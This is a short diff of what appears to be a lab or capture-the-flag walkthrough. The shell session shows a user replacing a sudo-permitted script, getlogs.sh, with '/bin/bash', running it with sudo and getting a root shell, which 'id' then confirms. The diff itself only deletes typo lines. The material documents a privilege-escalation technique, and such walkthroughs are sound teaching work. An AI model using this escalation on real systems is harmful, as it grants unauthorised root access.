@@ -281,10 +281,6 @@ ccoffee@slax:~/scripts$ mv getlogs.sh getlogs.sh.back
 ccoffee@slax:~/scripts$ echo '/bin/bash' > getlogs.sh
 ccoffee@slax:~/scripts$ chmod +x getlogs.sh
 ccoffee@slax:~/scripts$ sudo ./getlogs.sh
-bash-3.1# i
-bash: i: command not found
-bash-3.1# d
-bash: d: command not found
 bash-3.1# id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),17(audio),18(video),19(cdrom),26(tape),83(plugdev)
 
